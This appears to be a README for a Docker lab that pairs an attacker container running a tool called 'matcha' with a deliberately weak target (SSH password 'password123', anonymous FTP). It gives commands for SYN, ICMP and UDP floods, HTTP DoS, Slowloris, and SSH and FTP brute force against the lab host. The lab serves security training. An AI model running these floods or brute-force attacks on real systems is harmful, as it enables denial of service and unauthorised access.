# Two-Container Attack Simulation Demo

This guide walks you through the complete two-container setup — one running
the **matcha attacker** and one acting as the **vulnerable target**. Both
containers share an isolated Docker network so attacks stay safely contained.

## Architecture

```
┌─────────────────────────────┐        ┌──────────────────────────────┐
│       attacker              │        │         target               │
│   (matcha CLI image)        │◄──────►│  HTTP :80  SSH :22  FTP :21  │
│                             │        │  (nginx + openssh + vsftpd)  │
└─────────────────────────────┘        └──────────────────────────────┘
              └─────────────── lab (bridge network) ────────────────┘
```

## Prerequisites

- [Docker](https://docs.docker.com/get-docker/) installed and running
- Docker Compose v2 (`docker compose version`)

## Quick Start

### 1. Clone the repository (if not already done)

```bash
git clone https://github.com/Montimage/mmt-attacker.git
cd mmt-attacker
```

### 2. Start both containers

```bash
docker compose up --build -d
```

This builds the `target` image from `docker/target/Dockerfile` and pulls
the pre-built `attacker` image from GitHub Container Registry. Both
containers start in detached mode.

Verify both are running:

```bash
docker compose ps
```

```
NAME        IMAGE                                    STATUS    PORTS
attacker    mmt-attacker-attacker                    running
target      mmt-attacker-target                     running   0.0.0.0:8080->80/tcp, ...
```

### 3. Verify the target is reachable

```bash
# Check the HTTP service from your host
curl http://localhost:8080

# Or from inside the attacker container
docker compose exec attacker curl -s http://target
```

---

## Running Attacks

All attacks are run from inside the **attacker** container using
`docker compose exec attacker matcha <attack>`. The target container's
hostname on the shared network is `target`.

### SYN Flood (network layer)

```bash
docker compose exec attacker \
  matcha syn-flood \
    --target-ip target \
    --target-port 80 \
    --count 200
```

### HTTP DoS (application layer)

```bash
docker compose exec attacker \
  matcha http-dos \
    --target-url http://target \
    --threads 10
```

### Slowloris (application layer)

```bash
docker compose exec attacker \
  matcha slowloris \
    --target-url http://target \
    --connections 50
```

### SSH Brute Force (application layer)

The target exposes SSH on port 22 with a weak `demo:password123` credential.

```bash
# Create a small wordlist
docker compose exec attacker sh -c \
  "printf 'admin\nroot\npassword123\n' > /tmp/wordlist.txt"

docker compose exec attacker \
  matcha ssh-brute-force \
    --target-ip target \
    --username demo \
    --wordlist /tmp/wordlist.txt
```

### ICMP Flood (network layer)

```bash
docker compose exec attacker \
  matcha icmp-flood \
    --target-ip target \
    --count 100
```

### UDP Flood (network layer)

```bash
docker compose exec attacker \
  matcha udp-flood \
    --target-ip target \
    --target-port 80 \
    --count 200
```

### FTP Brute Force (application layer)

The target runs an FTP server with anonymous access enabled.

```bash
docker compose exec attacker \
  matcha ftp-brute-force \
    --target-ip target \
    --username anonymous \
    --wordlist /tmp/wordlist.txt
```

---

## Observing the Target

While attacks run, open a second terminal and inspect the target:

```bash
# Live nginx access log
docker compose exec target tail -f /var/log/nginx/access.log

# SSH auth log
docker compose exec target tail -f /var/log/auth.log

# Active network connections
docker compose exec target netstat -ant

# Drop into a shell on the target
docker compose exec target bash
```

---

## Tear Down

```bash
docker compose down
```

This stops and removes both containers. The `lab` network is also removed.
Your local images are preserved (re-run `up --build` to rebuild).

---

## Security Notes

- The `target` container is **intentionally misconfigured** (weak SSH
  password, anonymous FTP) for educational purposes.
- The `lab` bridge network isolates containers from the host network.
  Attacks do not reach real infrastructure.
- The `attacker` container requires `NET_ADMIN` and `NET_RAW` capabilities
  for raw-socket attacks. These are set in `docker-compose.yml`.
- Use only in **controlled, isolated environments** with explicit
  authorization. See [PLAYBOOK.md](PLAYBOOK.md) for ethical guidelines.
